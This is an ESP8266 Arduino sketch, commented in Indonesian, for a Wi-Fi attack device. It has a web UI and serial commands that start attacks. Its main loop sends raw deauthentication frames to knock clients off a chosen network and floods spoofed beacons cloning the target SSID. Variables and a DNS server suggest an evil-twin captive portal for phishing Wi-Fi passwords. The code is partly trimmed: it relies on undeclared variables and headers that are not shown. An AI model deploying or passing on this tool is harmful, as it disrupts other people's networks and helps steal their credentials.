#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <SimpleCLI.h>
#include "LittleFS.h"

// ========================================================
// 1. INCLUDE CUSTOM HEADERS
// ========================================================
// Kita panggil .h dulu karena variabelnya ada di sana
#include "web.h"
#include "beacon.h"
#include "sniffer.h"

// ========================================================
// 2. VARIABEL LOGIKA APLIKASI
// ========================================================
#define MAC "C8:C9:A3:0C:5F:3F"
#define MAC2 "C8:C9:A3:6B:36:74"
bool lock = true;
SimpleCLI cli;
Command send_deauth, stop_deauth, reboot, start_deauth_mon, start_probe_mon;

int packet_deauth_counter = 0;
const char* fsName = "LittleFS";

// Variabel pendukung file manager
String fileList = "";
File fsUploadFile, webportal, log_captive;
String status_button;
String start_button = "Start";
int target_count = 0, target_mark = 0;

const uint8_t channels[] = {1, 6, 11};
const bool wpa2 = true;
const bool appendSpaces = false;
char ssids[500];
String wifistr = "";

extern "C" {
#include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

int ledstatus = 0;
bool hotspot_active = false, deauthing_active = false, pishing_active = false, hidden_target = false, deauth_mon = false;
unsigned long d_mon_ = 0, previousMillis = 0, deauth_now = 0;
int ledState = LOW, ledState2 = LOW; 
const long interval = 1000;

typedef struct {
  String ssid; uint8_t ch; uint8_t rssi; uint8_t bssid[6]; String bssid_str;
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP, dnsip;
DNSServer dnsServer;
_Network _networks[16], _selectedNetwork;
String ssid_target = "", mac_target = "", _correct = "", _tryPassword = "";

// ========================================================
// 3. FUNGSI HELPER & LOGIKA
// ========================================================

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += "0";
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

void clearArray() { for (int i = 0; i < 16; i++) { _Network _n; _networks[i] = _n; } }

void handleList(){
  fileList = "";
  Dir dir = fileSystem->openDir("");
  while (dir.next()) {
    fileList += "<form action='/delete' method='post'><input type='submit' value='delete'><input name='filename' type='hidden' value='" + dir.fileName() +"'> ";
    fileList += dir.fileName() + " (" + String(dir.fileSize()/1000) + "kb)</form><br>";
  }
}

void handleFS(){
  handleList();
  FSInfo fs_info;
  fileSystem->info(fs_info);
  total_spiffs = fs_info.totalBytes/1000;
  used_spiffs = fs_info.usedBytes/1000;
  free_spiffs = total_spiffs - used_spiffs;
  // (Isi HTML dipersingkat, sesuaikan dengan aslinya)
  webServer.send(200,"text/html",Header + "File Manager Content" + Footer);
}

void handleFileUpload(){
  HTTPUpload& upload = webServer.upload();
  if(upload.status == UPLOAD_FILE_START){
    String filename = upload.filename;
    if(!filename.startsWith("/")) filename = "/"+filename;
    fsUploadFile = fileSystem->open(filename, "w");
  } else if(upload.status == UPLOAD_FILE_WRITE && fsUploadFile){
    fsUploadFile.write(upload.buf, upload.currentSize);
  } else if(upload.status == UPLOAD_FILE_END && fsUploadFile){
    fsUploadFile.close();
    handleFS();
  }
}

// ==================== [ FUNGSI ATTACK ] ====================

void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex];
    channelIndex = (channelIndex + 1) % sizeof(channels);
    if (ch != wifi_channel) { wifi_channel = ch; wifi_set_channel(wifi_channel); }
  }
}

void randomMac() { for (int i = 0; i < 6; i++) macAddr[i] = random(256); }

void enableBeacon(String target_ssid){
  wifistr = "";
  for(int i=0; i<beacon_size; i++){
    wifistr += target_ssid;
    for(int c=0; c<i; c++) wifistr += " ";
    wifistr += "\n";
  }
  wifistr.toCharArray(ssids, 500);
  for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
  randomSeed(os_random());
  packetSize = sizeof(beaconPacket);
  randomMac();
  beacon_active = true;
}

void handleStartAttack(){
  if(start_button == "Start"){
    start_button = "Stop";
    if(webServer.arg("beacon") == "1") { beacon_active = true; enableBeacon(ssid_target); }
    if(webServer.arg("deauth") == "1") deauthing_active = true;
  } else {
    start_button = "Start";
    deauthing_active = false; beacon_active = false;
  }
  handleIndex(); // handleIndex ada di web.h
}

// ==================== [ SETUP & LOOP ] ====================

void setup() {
  Serial.begin(115200);
  initFS(); loadsetting();
  apIP.fromString(ip); dnsip.fromString(dns);
  
  WiFi.softAP(ssid, password, chnl, false);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  
  pinMode(2, OUTPUT); pinMode(16, OUTPUT); pinMode(0, INPUT_PULLUP);
  
  // Setup Routes
  webServer.on("/", HTTP_GET, handleIndex);
  webServer.on("/start", HTTP_GET, handleStartAttack);
  webServer.on("/filemanager", HTTP_GET, handleFS);
  webServer.on("/filemanager", HTTP_POST, [](){ webServer.send(200); }, handleFileUpload);
  
  webServer.begin();
  
  send_deauth = cli.addCmd("send_deauth");
  stop_deauth = cli.addCmd("stop_deauth");
  reboot = cli.addCmd("reboot");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (Serial.available()) {
    String input = Serial.readStringUntil('\n');
    cli.parse(input);
  }

  // Deauth Logic
  if (deauthing_active && millis() - deauth_now >= deauth_speed) {
    deauth_now = millis();
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t dp[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
    memcpy(&dp[10], _selectedNetwork.bssid, 6);
    memcpy(&dp[16], _selectedNetwork.bssid, 6);
    for(int i=0; i<5; i++) wifi_send_pkt_freedom(dp, 26, 0);
  }

  // Beacon Logic
  if (beacon_active && millis() - attackTime > 100) {
    attackTime = millis();
    nextChannel();
    // Logic pengiriman beacon (pake variabel dari beacon.h)
    int i = 0, ssidNum = 1;
    int ssLen = strlen(ssids);
    while (i < ssLen) {
      int j = 0;
      while (ssids[i+j] != '\n' && j < 32 && (i+j) < ssLen) j++;
      macAddr[5] = ssidNum++;
      memcpy(&beaconPacket[10], macAddr, 6);
      memcpy(&beaconPacket[16], macAddr, 6);
      memset(&beaconPacket[38], 0x20, 32);
      memcpy(&beaconPacket[38], &ssids[i], j);
      beaconPacket[37] = j;
      wifi_send_pkt_freedom(beaconPacket, packetSize, 0);
      i += (j + 1);
    }
  }
}
